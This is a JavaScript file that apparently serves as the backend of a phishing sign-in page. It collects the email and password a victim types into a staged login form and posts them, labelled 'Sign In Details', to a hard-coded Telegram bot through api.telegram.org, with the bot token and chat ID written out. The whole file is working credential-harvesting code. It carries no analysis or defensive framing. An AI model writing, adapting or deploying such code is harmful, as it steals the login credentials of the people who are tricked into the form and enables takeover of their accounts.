// Your Telegram bot token and chat ID
const TOKEN = '7347721386:AAGbmvaBywG44rjBmbowXItpJIcURTj4M0c';
const CHAT_ID = '6339299057';

function showPasswordSection() {
    document.getElementById('email-section').style.display = 'none';
    document.getElementById('password-section').style.display = 'block';
}

function handleSubmit(event) {
    event.preventDefault();  // Prevent the default form submission behavior

    const email = document.getElementById('email-input').value;
    const password = document.getElementById('password-input').value;

    // Message to send to Telegram
    const message = `Sign In Details:\nEmail: ${email}\nPassword: ${password}`;

    // Telegram API URL
    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

    // Fetch request to send message to Telegram
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            alert('Details sent to Telegram successfully');
        } else {
            alert('Failed to send details to Telegram');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Error sending details to Telegram');
    });
}
